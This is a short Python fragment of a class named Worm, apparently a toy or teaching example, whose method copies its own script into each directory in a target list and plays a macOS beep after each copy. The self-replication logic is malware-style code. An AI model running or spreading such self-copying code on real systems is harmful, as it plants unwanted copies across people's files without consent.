...
class Worm:
    ...
    def create_new_worm(self):
        for directory in self.target_dir_list:
            ...
            # copy the script to the new directory with a similar name
            shutil.copyfile(self.own_path, destination)

            # Add a beep sound and adjust the volume for macOS
            os.system("osascript -e 'set volume output volume 50' && afplay /System/Library/Sounds/Ping.aiff")

            # Pause for a short time to allow the sound to play
            time.sleep(1)
